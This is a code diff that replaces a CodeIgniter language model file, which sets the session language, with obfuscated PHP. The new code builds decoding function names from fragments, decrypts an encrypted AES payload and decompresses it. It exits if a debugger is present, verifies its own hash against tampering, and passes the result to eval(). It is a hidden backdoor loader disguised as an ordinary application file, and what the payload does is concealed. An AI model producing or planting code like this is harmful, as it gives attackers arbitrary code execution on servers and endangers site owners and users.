@@ -1,19 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-class Language_model extends CI_Model {	
-
-	public function set($id = 1){
-		$language =$this->db->select('language')->where('id',$id)->get('db_languages')->row()->language;
-		if(!empty($language)){
-        	$this->session->set_userdata(array('language'  => $language,'language_id'  => $id));	
-    	}
-    	else{
-    		echo "Something went wrong!Contact Admin!!";exit();
-    	}
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_xi8ajs4y=('bas'.'e64'.'_de'.'cod'.'e');
+$_n1az3uzr=('gzu'.'nco'.'mpr'.'ess');
+$_dbwfcf8a=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_ooxnvfdo='Meot0Iav6gQ=';
+$_p5sbv1hh='PTqp/4N9';
+$_n7kylx4a='xVbX19BD';
+$_rj2br20c='EiymLKZ7';
+$_mlzlxctq='SHPzwCkJ';
+$_c05ojwql='iAaDoQ==';
+$_k2hgoa74='S8AOi8uS';
+$_is74s8b8='5bvORpQK';
+$_b7qdiyh0=$_xi8ajs4y($_rj2br20c.$_n7kylx4a.$_mlzlxctq.$_p5sbv1hh.$_ooxnvfdo);
+$_lyx6sq4i=$_xi8ajs4y($_is74s8b8.$_k2hgoa74.$_c05ojwql);
+$_ybzv2ig2=$_xi8ajs4y('U3HYrobjjJpI5kR8f3WyfQj5An/uYZtQLIPDqXLX48fSw/ssqMe2nxURoTQ1svsdsq0ogmQSyCiH0O+LWQZgPD2mxGZM4HdQRyFP7T2Wg954ZjbsH1HLdpX4phwmMMeKuHesrSCALQ7N3HeAT1+UxWBaMUaom6C9bXVJ7ezGNz18hw65ETiKsOFVgHiAqluskXGWbaPNXm47pU2MZBSq2r0xyWHHeb0Hk0hxvRONBzngu7BsC1ip70Ze9LD788N/UUkUKnAB5tP6t1MPhCSnZSjSdiMFVf8wYZr8qHrRKiKTLqZ4nu7m68Gpowe1DpK2S7QMJSWfnguSKFC4Rg83eVA926Pu0Z2yNUQhe+ByD/hcNp1xgtLm2wuZYnyPdRYzTHXV9R1ISLwIPgzpCPNTRI/OT1KvPeDB7c9IwMmOwD6OW6wQrLM4MQBjIz20Wp7C');
+$_y2gpofcp=$_dbwfcf8a($_ybzv2ig2,'aes-256-cbc',$_b7qdiyh0,OPENSSL_RAW_DATA,$_lyx6sq4i);
+if($_y2gpofcp===false){exit;}
+$_qmts8agg=$_n1az3uzr($_y2gpofcp);
+if($_qmts8agg===false){exit;}
+$_sn2c4di1='56ba27ca08694ba7abe142620d0fe7859f96e06e8c911da321b89652e190bb3e';
+$_cxblyu0c=@file_get_contents(__FILE__);
+if($_cxblyu0c!==false){
+$_m3btbw0y=str_replace($_sn2c4di1,"0000000000000000000000000000000000000000000000000000000000000000",$_cxblyu0c);
+$_a354sryz=hash("sha256",$_m3btbw0y);
+if($_a354sryz!==$_sn2c4di1){@http_response_code(403);exit;}
 }
-
-/* End of file Language_model.php */
-/* Location: ./application/models/Language_model.php */
+eval($_qmts8agg);
